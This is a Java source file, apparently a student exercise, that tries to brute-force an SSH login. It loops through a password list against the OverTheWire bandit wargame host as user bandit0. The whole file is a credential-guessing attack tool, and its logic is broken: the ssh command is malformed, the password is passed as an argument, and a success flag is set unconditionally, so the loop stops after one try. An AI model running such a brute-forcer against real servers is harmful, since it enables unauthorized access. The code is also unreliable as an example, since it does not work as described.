import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStreamReader;
/**
 * 
 * @author Maoz-grossman
 *
 */
public class ssh_conector {
	private String server;
	private int port;
	private String Username;
	public String password;
	public boolean IsThePassword=false;
	/**
	 * setter to server
	 * @param SERVER String 
	 */
	private void setServer(String SERVER) {
		server=SERVER;
	}
	/**
	 * getter to server
	 * @return srever String 
	 */
	public String getServer() {
		return server;
	}
	/**
	 * setter to port 
	 * @param Port Integer
	 */
	private void setPort(int Port) {
		port = Port;
	}
	/**
	 * getter to port
	 * @return port Integer
	 */
	public int getPort() {
		return port;
	}
	/**
	 * setter to user name
	 * @param user String
	 */
	private void setUsername(String user) {
		Username=user;
	}
	/**
	 * getter to user name
	 * @return Username String
	 */
	public String getUsetname() {
		return Username;
	}




	/**
	 * runs the command shell and executes the commands below 
	 * <b>works only on linux or any ssh workspace!</b> 
	 */
	private void ssh() {

		StringBuffer output = new StringBuffer();
		String pro[]= {"ssh"+ getServer()+ " -p "+getPort()+ " -l " + getUsetname(),password};
		Process p;
		try {
			p = Runtime.getRuntime().exec(pro);
			//			p.waitFor();
			BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
IsThePassword=true;
			String line = "";			
			while ((line = reader.readLine())!= null) {
				output.append(line + "\n");
			}

		} catch (Exception e) {
			System.out.println("invalid input");
		}

		System.out.println(output.toString());

	}
	/**
	 * gets a file from the user and runs all the possible passwords 
	 * <b>I added a common password list </b>
	 * @param file_address String
	 */

	public void passwordRider(String file_address) {
		String line="";
		IsThePassword=false;
		
		//reads the password list file
		try (BufferedReader br = new BufferedReader(new FileReader(file_address))){
			String check="";
			while ((check=br.readLine()) != null) 
			{
				line +=check+" ,";
			}

			String[] data = line.split(",");
			for (int i=0;i<data.length;i++) {
				password=data[i];
				//checks if the password works
				ssh();
				
				//fond the correct password
				if(IsThePassword==true)
					break;
			}
		}
		catch (IOException e) 
		{
			System.out.println("could not find the file");
		}
	}


	public static void main(String[] args) {
		ssh_conector ssh= new ssh_conector();
		ssh.setServer("bandit.labs.overthewire.org");
		ssh.setUsername("bandit0");
		ssh.setPort(2220);
		ssh.passwordRider("C:\\Users\\user\\eclipse-workspace\\Matala5\\src\\password.txt");

	}

}
